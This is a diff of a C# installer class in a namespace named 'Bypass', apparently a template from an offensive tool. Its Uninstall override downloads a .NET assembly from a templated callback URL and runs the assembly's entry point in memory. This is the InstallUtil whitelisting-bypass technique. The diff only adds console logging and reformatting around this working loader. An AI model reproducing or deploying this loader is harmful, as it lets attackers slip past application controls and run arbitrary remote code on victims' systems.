@@ -19,29 +19,35 @@ namespace Bypass
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-        try
-        {
-            string url = "[[[[callbackURL]]]]";
-
-            WebClient client = new WebClient();
-
-             byte[] executableBytes = client.DownloadData(url);
-            Assembly assembly = Assembly.Load(executableBytes);
-            MethodInfo entryPoint = assembly.EntryPoint;
-            if (entryPoint != null)
+            try
             {
-                object[] parameters = entryPoint.GetParameters().Length == 0 ? null : new object[] { new string[] { [[[[commandlineArguments]]]] } };
-                entryPoint.Invoke(null, parameters);
+                string url = "[[[[callbackURL]]]]";
+                Console.WriteLine("Pulling executable from " + url);
+                WebClient client = new WebClient();
+                byte[] executableBytes = client.DownloadData(url);
+                Assembly assembly = Assembly.Load(executableBytes);
+                MethodInfo entryPoint = assembly.EntryPoint;
+                if (entryPoint != null)
+                {
+                    string[] cmdargs = new string[] { [[[[commandlineArguments]]]] };
+                    Console.WriteLine("Calling exe with the following arguments");
+                    foreach(var arg in cmdargs)
+                    {
+                        Console.Write(" ");
+                        Console.Write(arg);
+                    }
+                    object[] parameters = entryPoint.GetParameters().Length == 0 ? null : new object[] { cmdargs };
+                    entryPoint.Invoke(null, parameters);
+                }
+                else
+                {
+                    Console.WriteLine("The loaded assembly does not have an entry point.");
+                }
             }
-            else
+            catch (Exception ex)
             {
-                Console.WriteLine("The loaded assembly does not have an entry point.");
+                Console.WriteLine("An exception occured: " + ex.Message);
             }
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine("An exception occured: " + ex.Message);
-        }
         }
     }
 }
